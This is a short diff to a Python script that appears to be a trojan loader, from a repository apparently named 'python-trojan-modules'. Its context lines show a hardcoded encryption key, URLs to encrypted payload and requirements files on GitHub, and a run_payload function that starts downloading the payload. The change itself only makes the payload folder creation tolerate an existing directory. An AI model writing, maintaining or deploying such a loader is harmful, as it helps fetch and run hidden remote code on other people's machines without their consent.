@@ -9,7 +9,12 @@ import os
 key = b'8Shjz6mNyel8p7qNCETNEqrxBodA2MZbOtsJ6un79EQ='
 payload_url = "https://raw.githubusercontent.com/stephanevdb/python-trojan-modules/main/payload.py.enc"
 requirements_url = "https://raw.githubusercontent.com/stephanevdb/python-trojan-modules/main/requirements.txt.enc"
-os.mkdir('payload')
+
+if not os.path.exists('payload'):
+    os.makedirs('payload')
+    print("Folder created successfully.")
+else:
+    print("Folder already exists.")
 
 def run_payload():
     p = requests.get(payload_url, allow_redirects=True)
